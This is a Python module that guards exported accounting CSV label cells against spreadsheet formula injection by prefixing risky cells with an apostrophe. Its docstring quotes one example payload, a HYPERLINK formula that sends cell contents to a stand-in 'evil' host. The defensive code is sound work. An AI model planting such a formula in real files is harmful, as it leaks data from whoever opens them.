"""Neutralize spreadsheet formula injection in exported CSV cells.

FOCUS data flows from provider exports into the journal and audit CSVs that
research accounting opens in Excel / LibreOffice.  A cell whose text begins
with ``=``, ``+``, ``-``, ``@``, or a control character (tab, carriage
return) is interpreted as a *formula* by those tools — so a resource named
``=HYPERLINK("http://evil?"&A1,"ok")`` would execute the moment the file is
opened.  We prefix any such cell with a single quote, which spreadsheets
treat as "this is literal text" and strip on display.

Only string *label* fields go through this guard.  Amount cells are
pre-formatted Decimals (``"-42.00"`` for a credit) and must NOT be guarded —
prefixing them with an apostrophe would turn a numeric column into text and
break the accountant's totals.  That is why the writers apply ``csv_safe``
per-field rather than blanket-wrapping every value.
"""

_DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str) -> str:
    """Return ``value`` guarded against CSV/spreadsheet formula injection.

    A string beginning with a formula trigger is prefixed with a leading
    apostrophe; everything else passes through unchanged.
    """
    if value and value[0] in _DANGEROUS_PREFIXES:
        return "'" + value
    return value
